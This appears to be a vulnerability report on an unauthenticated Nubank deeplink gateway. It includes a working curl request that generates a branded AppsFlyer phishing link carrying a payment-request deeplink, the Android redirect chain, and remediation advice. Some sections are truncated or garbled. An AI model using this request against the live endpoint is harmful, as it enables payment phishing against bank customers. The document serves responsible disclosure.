► Vulnerability Summary

What is exposed

The Mobile Measurement Platform (MMP) gateway at prod-global-mmp-gateway.nu.com.co and prod-global-mmp-gateway.nu.com.mx accepts any nuapp:// deeplink URL and generates a real, functional nubank.onelink.me AppsFlyer tracking URL — with no authentication and no rate limiting.

The generated URLs use Nubank's official AppsFlyer subdomain and cannot be distinguished from legitimate Nubank campaign links. The full deeplink payload — including financial action parameters — is preserved verbatim and passed to the Nubank mobile app when a victim opens the link.

► Confirmed Evidence — HTTP 201, No Authentication Required

► Payment Deeplink Injection — Android Redirect Chain

When a victim opens the generated URL on Android, AppsFlyer redirects to the Play Store with the full attacker-supplied deeplink preserved in the referrer parameter. The Nubank app reads this parameter on install/open and routes to the embedded deeplink. 

# Step 1 — Attacker generates phishing link (no auth):
$ curl -s "https://prod-global-mmp-gateway.nu.com.co/api/deeplink-url" \
    -X POST -H "Content-Type: application/json" \
    -H "X-Correlation-Id: bc-handle" \
    -d '{"deeplink":"nuapp://payment-request?amount=1000&to=attacker"}'

{"url":"https://nubank.onelink.me/jTeG/zrixcvuv"}

# Step 2 — Android redirect (AppsFlyer → Play Store):

  %26af_tranid%3DMTI4NTI0ODE1NDk4NjU0NDU3ODQ%3D
  %26deep_link_value%3Dnuapp%253A%252F%252Fpayment-request
  %253Famount%253D1000%2526to%253Dattacker

# Decoded deep_link_value:

$ curl -s "https://prod-global-mmp-gateway.nu.com.co/api/deeplink-url" \
    -X POST -H "Content-Type: application/json" \

                                           ↑ Clojure regex            ↑ input reflected verbatim
Discloses:
  • Internal Clojure validation function (named / re-find)
  • Exact regex used: #"^nuapp://"
  • User input reflected in error body (potential log injection)
  • Technology stack: Clojure backend

► Remediation

IssueFix
Require authentication The /api/deeplink-url endpoint must require a valid user session token or service API key before generating tracking links
Implement deeplink allowlist Validate deeplink paths against a strict allowlist of legitimate in-app destinations; reject paths containing financial action parameters (payment-request, transfer) not initiated from an authenticated session
Add rate limiting Enforce per-IP and per-authenticated-user rate limits (e.g., 10 requests per minute per IP)
Sanitize error responses Replace verbose Clojure validation error messages with generic responses; never reflect user input verbatim in error bodies
